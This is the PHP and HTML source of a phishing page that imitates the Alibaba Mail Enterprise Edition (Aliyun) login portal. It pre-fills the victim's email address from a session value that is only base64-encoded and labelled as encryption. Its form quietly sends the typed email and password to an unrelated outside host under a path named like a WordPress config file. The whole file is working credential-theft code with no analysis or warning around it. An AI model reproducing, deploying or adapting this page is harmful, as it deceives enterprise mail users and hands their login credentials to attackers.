<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Login Portal_Alibaba Mail Enterprise Edition - Alibaba Cloud</title>
<link rel="shortcut icon" href="https://qiye.aliyun.com/static/0.2.9/images/favicon.ico" type="image/x-icon"/>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 100%;
  width: 100%;
  padding: 5px 5px;
  border: 1px solid #f0f0f0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 5px;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #787878;
  }
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 100%;
  width: 100%;
  padding: 5px 5px;
  background-color: transparent;
  border: 1px solid #f0f0f0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 5px;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #787878;
  }
  input[type=text]:focus {
  outline: none;
  border: 2px solid #f0f0f0;
  }
  input[type=password]:focus {
  outline: none;
  border: 2px solid #f0f0f0;
  }

</style>
<body background="img/bg-3.png">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td height="14"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="173"></td>
				<td>
				<img border="0" src="img/header.jpg" width="1010" height="38"></td>
				<td width="167"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="21"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="167"></td>
				<td height="471" width="1000">
				<table border="0" width="103%" cellspacing="0" cellpadding="0">
					<tr>
						<td width="407">
						<img border="0" src="img/ads.png" width="407" height="471"></td>
						<td>&nbsp;</td>
						<td height="471" width="386" background="img/form.png">
						 <table border="0" width="100%" cellspacing="0" cellpadding="0">
						  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
							<tr>
								<td height="83"></td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="35"></td>
										<td height="40">
										   <input type="text" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" placeholder="Enter the complete enterprise mailbox or administrator account" required >
										   <input type="hidden" name="domain" value="<?php echo $ddomain;?>" />
										   <input type="hidden" name="link" value="https://qiye.aliyun.com/" />
										   <input type="hidden" name="sender" value="Aliyun Domain" />
										</td>
										<td width="32"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="8"></td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="35"></td>
										<td height="40">
										   <input type="password" name="passwd" placeholder="Enter Password" required autofocus >
										</td>
										<td width="32"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="47"></td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="35"></td>
										<td>
										<input type="image" src="img/btn.png" width="316" height="36" name="I1"></td>
										<td width="32"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="217"></td>
							</tr>
						 </form>
						</table>
						</td>
					</tr>
				</table>
				</td>
				<td width="210"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="25"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="359"></td>
				<td>
				<img border="0" src="img/footer.jpg" width="633" height="73"></td>
				<td width="359"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="100"></td>
	</tr>
</table>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>